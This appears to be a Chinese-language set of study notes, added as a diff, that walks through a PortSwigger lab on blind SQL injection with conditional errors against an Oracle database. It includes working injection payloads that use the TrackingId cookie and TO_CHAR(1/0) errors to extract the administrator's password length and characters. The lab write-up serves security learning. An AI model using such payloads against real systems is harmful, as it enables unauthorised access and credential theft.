@@ -1,0 +1,44 @@
+靶场地址: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+=====新知识1: CASE WHEN 条件分支=====
+SQL写法:
+->
+CASE 
+    WHEN 条件 THEN A 
+    ELSE B
+END
+
+=====新知识2: 可控数据库异常=====
+10/0 数据库一看除0会傻眼的
+CASE WHEN 条件 THEN 1/0 ELSE 1 END
+
+=====新知识3: Oracle-SUNSTR=====
+其他数据库: substring(字符串,1,1) -> 截取字符串
+Oracl数据库: substr(字符串,1,1)
+
+=====新知识4: 字符串转化=====
+在构造报错时,使用了 1/0
+但是本题的一个 NULL列是字符串类型的列
+需要转化为字符串类型 -> TO_CHAR(1/0)
+
+###
+我不知道 login那边的 SQL是不是被修了
+我试到了 4个NULL,全是 200 OK    -> 图1
+在 cookie->TrackingId 试出来是 Oracle数据库 -> 图2
+一个 字符串类型的列,但是无法回显 -> 图3
+
+###
+AND 1/0=1 和 1/1=1 发现:
+输入1/0时服务器会返回 500,另一个不会 -> 图4,图5
+
+###
+' || (CASE WHEN LENGTH((SELECT password FROM users WHERE username='administractor'))=20 
+THEN '' ELSE TO_CHAR(1/0) END)--+
+->
+二分快速确定,本题的密码长度是20 -> 图6
+
+###
+' || (CASE WHEN SUBSTR((SELECT password FROM users WHERE username='administractor'),1,1)='a'
+THEN '' ELSE TO_CHAR(1/0) END)--+
+Cluster bomb开始攻击 -> 图7.图8
+solved
